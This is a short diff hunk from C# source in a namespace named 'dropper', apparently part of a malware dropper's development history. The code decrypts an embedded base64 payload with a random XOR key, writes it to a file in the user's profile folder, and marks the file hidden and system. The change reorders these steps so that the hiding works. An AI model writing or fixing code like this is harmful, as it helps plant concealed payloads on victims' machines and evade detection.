@@ -12,8 +12,8 @@ namespace dropper
             string xorkey = RandomString(20, rng);
             byte[] encrypted = XORCrypt(Convert.FromBase64String(Resource1.payload_data), xorkey);
             string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
-            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp", FileAttributes.System | FileAttributes.Hidden);
             File.WriteAllBytes(temppath, encrypted);
+            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp", FileAttributes.System | FileAttributes.Hidden);
 
             string srcvarname = RandomString(6, rng);
             string classname = RandomString(6, rng);
